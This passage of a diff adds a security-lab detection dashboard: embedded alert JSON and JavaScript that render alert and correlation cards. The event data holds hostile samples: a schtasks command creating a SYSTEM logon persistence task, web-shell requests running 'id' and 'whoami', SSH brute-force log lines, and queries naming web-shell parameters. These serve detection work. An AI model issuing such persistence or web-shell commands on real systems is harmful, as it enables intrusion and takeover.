(1)", "first_seen": "2026-11-11T10:47:48.848Z", "last_seen": "2026-11-11T10:47:48.848Z", "events": [{"@timestamp": "2026-11-11T10:47:48.848Z", "event": {"code": "1", "kind": "event", "category": ["process"], "type": ["start"], "dataset": "windows.sysmon_operational", "module": "windows"}, "host": {"name": "WIN10-LAB", "os": {"type": "windows", "platform": "windows"}}, "user": {"name": "LAB\\analyst", "domain": "LAB"}, "process": {"name": "schtasks.exe", "executable": "C:\\Windows\\System32\\schtasks.exe", "executable.caseless": "c:\\windows\\system32\\schtasks.exe", "command_line": "schtasks.exe /create /tn \"Updater\" /tr \"C:\\Users\\Public\\upd.exe\" /sc onlogon /ru SYSTEM /f", "pid": 4113, "parent": {"name": "cmd.exe", "executable": "C:\\Windows\\System32\\cmd.exe", "executable.caseless": "c:\\windows\\system32\\cmd.exe", "command_line": "cmd.exe /c schtasks /create /tn Updater", "pid": 1047}}, "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1", "computer_name": "WIN10-LAB", "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /tn \"Updater\" /tr \"C:\\Users\\Public\\upd.exe\" /sc onlogon /ru SYSTEM /f", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "LAB\\analyst"}}}]}, {"rule_id": "7c0e4b19-3f82-4a6d-9e57-1b8d5c2f0a46", "title": "Web Request to Common Web Shell Parameter", "level": "medium", "techniques": ["T1505.003"], "tactics": ["execution", "persistence"], "index": ["lab-web"], "query": "any where (url.query like~ (\"*cmd=*\", \"*exec=*\", \"*shell=*\", \"*command=*\")) and (not (url.path like~ (\"*/health\", \"*/status\")))", "query_kql": "(url.query:(*cmd\\=* OR *exec\\=* OR *shell\\=* OR *command\\=*)) AND (NOT (url.path:(*\\/health OR *\\/status)))", "count": 7, "host": "web01 (7)", "first_seen": "2026-11-11T10:53:38.848Z", "last_seen": "2026-11-11T10:54:53.848Z", "events": [{"@timestamp": "2026-11-11T10:53:38.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "GET"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": "cmd=id"}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}, {"@timestamp": "2026-11-11T10:53:53.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "GET"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": "cmd=id"}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}, {"@timestamp": "2026-11-11T10:54:08.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "GET"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": "cmd=id"}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}, {"@timestamp": "2026-11-11T10:54:23.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "GET"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": "cmd=id"}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}, {"@timestamp": "2026-11-11T10:54:28.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "GET"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": "cmd=whoami"}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" GET /uploads/shell.php?cmd=whoami HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}, {"@timestamp": "2026-11-11T10:54:38.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "GET"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": "cmd=id"}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}, {"@timestamp": "2026-11-11T10:54:53.848Z", "event": {"kind": "event", "category": ["web"], "type": ["access"], "outcome": "success", "dataset": "nginx.access", "module": "nginx"}, "host": {"name": "web01", "os": {"type": "linux", "platform": "linux"}}, "http": {"request": {"method": "GET"}, "response": {"status_code": 200}}, "url": {"path": "/uploads/shell.php", "query": "cmd=id"}, "source": {"ip": "203.0.113.77"}, "user_agent": {"original": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, "message": "203.0.113.77 - - \" GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\""}]}, {"rule_id": "8a4c2f17-5d9b-4e31-a6c8-1e7f3b0d9c42", "title": "SSH Failed Password Authentication", "level": "low", "techniques": ["T1110.001"], "tactics": ["credential_access"], "index": ["lab-linux"], "query": "any where message:\"*Failed password*\"", "query_kql": "message:*Failed\\ password*", "count": 17, "host": "linux01 (17)", "first_seen": "2026-11-11T10:18:18.848Z", "last_seen": "2026-11-11T10:55:12.848Z", "events": [{"@timestamp": "2026-11-11T10:18:18.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "deploy"}, "source": {"ip": "198.51.100.9", "port": 52629}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for deploy from 198.51.100.9 port 44220 ssh2"}, {"@timestamp": "2026-11-11T10:19:18.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "deploy"}, "source": {"ip": "198.51.100.9", "port": 42812}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for deploy from 198.51.100.9 port 44221 ssh2"}, {"@timestamp": "2026-11-11T10:20:18.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "deploy"}, "source": {"ip": "198.51.100.9", "port": 55098}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for deploy from 198.51.100.9 port 44222 ssh2"}, {"@timestamp": "2026-11-11T10:51:18.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "root"}, "source": {"ip": "203.0.113.44", "port": 40094}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user root from 203.0.113.44 port 51000 ssh2"}, {"@timestamp": "2026-11-11T10:51:36.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "admin"}, "source": {"ip": "203.0.113.44", "port": 51222}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user admin from 203.0.113.44 port 51001 ssh2"}, {"@timestamp": "2026-11-11T10:51:54.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "oracle"}, "source": {"ip": "203.0.113.44", "port": 42811}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user oracle from 203.0.113.44 port 51002 ssh2"}, {"@timestamp": "2026-11-11T10:52:12.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "postgres"}, "source": {"ip": "203.0.113.44", "port": 49018}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user postgres from 203.0.113.44 port 51003 ssh2"}, {"@timestamp": "2026-11-11T10:52:30.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "ubuntu"}, "source": {"ip": "203.0.113.44", "port": 56112}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user ubuntu from 203.0.113.44 port 51004 ssh2"}, {"@timestamp": "2026-11-11T10:52:48.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "test"}, "source": {"ip": "203.0.113.44", "port": 57274}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user test from 203.0.113.44 port 51005 ssh2"}, {"@timestamp": "2026-11-11T10:53:06.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "root"}, "source": {"ip": "203.0.113.44", "port": 59470}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user root from 203.0.113.44 port 51006 ssh2"}, {"@timestamp": "2026-11-11T10:53:24.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "admin"}, "source": {"ip": "203.0.113.44", "port": 52738}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user admin from 203.0.113.44 port 51007 ssh2"}, {"@timestamp": "2026-11-11T10:53:42.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "oracle"}, "source": {"ip": "203.0.113.44", "port": 44572}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user oracle from 203.0.113.44 port 51008 ssh2"}, {"@timestamp": "2026-11-11T10:54:00.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "postgres"}, "source": {"ip": "203.0.113.44", "port": 41217}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user postgres from 203.0.113.44 port 51009 ssh2"}, {"@timestamp": "2026-11-11T10:54:18.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "ubuntu"}, "source": {"ip": "203.0.113.44", "port": 56524}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user ubuntu from 203.0.113.44 port 51010 ssh2"}, {"@timestamp": "2026-11-11T10:54:36.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "test"}, "source": {"ip": "203.0.113.44", "port": 59043}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user test from 203.0.113.44 port 51011 ssh2"}, {"@timestamp": "2026-11-11T10:54:54.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "root"}, "source": {"ip": "203.0.113.44", "port": 52412}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user root from 203.0.113.44 port 51012 ssh2"}, {"@timestamp": "2026-11-11T10:55:12.848Z", "event": {"kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure", "dataset": "system.auth", "module": "system"}, "host": {"name": "linux01", "os": {"type": "linux", "platform": "linux"}}, "user": {"name": "admin"}, "source": {"ip": "203.0.113.44", "port": 46407}, "system": {"auth": {"ssh": {"event": "Failed", "method": "password"}}}, "message": "Failed password for invalid user admin from 203.0.113.44 port 51013 ssh2"}]}], "correlations": [{"correlation_id": "corr-ssh-bruteforce", "title": "SSH Brute Force Against a Single Host", "level": "high", "technique": "T1110.001", "group_by": "source.ip", "group_value": "203.0.113.44", "count": 8, "threshold": 8, "window_seconds": 300, "first_seen": "2026-11-11T10:51:18.848000Z", "last_seen": "2026-11-11T10:53:24.848000Z", "index": "lab-linux"}, {"correlation_id": "corr-web-shell-burst", "title": "Repeated Web Shell Command Execution", "level": "high", "technique": "T1505.003", "group_by": "source.ip", "group_value": "203.0.113.77", "count": 5, "threshold": 5, "window_seconds": 120, "first_seen": "2026-11-11T10:53:38.848000Z", "last_seen": "2026-11-11T10:54:28.848000Z", "index": "lab-web"}]};
+const state = { level: "all", host: "all", q: "" };
+
+const esc = (value) => String(value ?? "").replace(/[&<>"']/g, (c) => (
+  { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]
+));
+const clock = (value) => String(value || "").slice(11, 19);
+
+function evidence(alert) {
+  const events = (alert.events || []).slice(0, 3);
+  return `<details>
+    <summary>evidence &amp; detection query</summary>
+    <pre>${esc(JSON.stringify(events, null, 2))}</pre>
+    <pre>${esc(alert.query || "")}</pre>
+  </details>`;
+}
+
+function alertCard(alert) {
+  const tech = (alert.techniques || []).map((t) => `<span class="tech">${esc(t)}</span>`).join("");
+  return `<article class="card ${esc(alert.level)}" data-level="${esc(alert.level)}"
+      data-host="${esc(alert.host)}" data-text="${esc((alert.title + " " + (alert.techniques || []).join(" ")).toLowerCase())}">
+    <div class="top">
+      <h3>${esc(alert.title)}</h3>
+      <span class="lvl ${esc(alert.level)}">${esc(alert.level)}</span>
+    </div>
+    <div class="meta">
+      <span>host: ${esc(alert.host)}</span>
+      <span>matches: ${esc(alert.count)}</span>
+      <span>${esc(clock(alert.first_seen))}Z &rarr; ${esc(clock(alert.last_seen))}Z</span>
+    </div>
+    <div>${tech}</div>
+    ${evidence(alert)}
+  </article>`;
+}
+
+function corrCard(corr) {
+  return `<article class="card ${esc(corr.level)}" data-level="${esc(corr.level)}"
+      data-host="${esc(corr.group_value)}" data-text="${esc((corr.title + " " + corr.technique).toLowerCase())}">
+    <div class="top">
+      <h3>${esc(corr.title)}</h3>
+      <span class="lvl ${esc(corr.level)}">${esc(corr.level)}</span>
+    </div>
+    <div class="meta">
+      <span>${esc(corr.group_by)}: ${esc(corr.group_value)}</span>
+      <span>${esc(corr.count)}/${esc(corr.threshold)} in ${esc(corr.window_seconds)}s</span>
+      <span>${esc(corr.first_seen).slice(11, 19)}Z &rarr; ${esc(corr.last_seen).slice(11, 19)}Z</span>
+    </div>
+    <div><span class="tech">${esc(corr.technique)}</span></div>
+  </article>`;
+}
+
+function render() {
+  const alerts = DATA.alerts.filter((alert) => {
+    if (state.level !== "all" && alert.level !== state.level) return false;
+    if (state.host !== "all" && !String(alert.host).includes(state.host)) return false;
+    if (state.q) {
+      const hay = (alert.title + " " + (alert.techniques || []).join(" ") + " " + alert.host).toLowerCase();
+      if (!hay.includes(state.q)) return false;
+    }
+    return true;
+  });
+  const corrs = DATA.correlations.filter((corr) => state.level === "all" || corr.level === state.level);
+
+  document.getElementById("alerts").innerHTML = alerts.length
+    ? alerts.map(alertCard).join("")
+    : '<div class="empty">no detections match this filter</div>';
+  document.getElementById("correlations").innerHTML = corrs.length
+    ? corrs.map(corrCard).join("")
+    : '<div class="empty">no correlation alerts match this filter</div>';
+}
+
+document.querySelectorAll(".chip").forEach((chip) => {
+  chip.addEventListener("click", () => {
+    document.querySelectorAll(".chip").forEach((c) => c.classList.remove("active"));
+    chip.classList.add("active");
+    state.level = chip.dataset.level;
+    render();
+  });
+});
+
+document.getElementById("host").addEventListener("change", (event) => {
+  state.host = event.target.value;
+  render();
+});
+
+document.getElementById("q").addEventListener("input", (event) => {
+  state.q = event.target.value.toLowerCase().trim();
+  render();
+});
+
+document.addEventListener("keydown", (event) => {
+  if (event.key === "/" && document.activeElement !== document.getElementById("q")) {
+    event.preventDefault();
+    document.getElementById("q").focus();
+  }
+});
+
+document.querySelectorAll(".tile").forEach((tile) => {
+  tile.addEventListener("click", () => {
+    const technique = tile.dataset.tech;
+    if (!technique) return;
+    document.getElementById("q").value = technique;
+    state.q = technique.toLowerCase();
+    render();
+    document.getElementById("alerts").scrollIntoView({ behavior: "smooth", block: "start" });
+  });
+});
+
+render();
+</script>
+</body>
+</html>
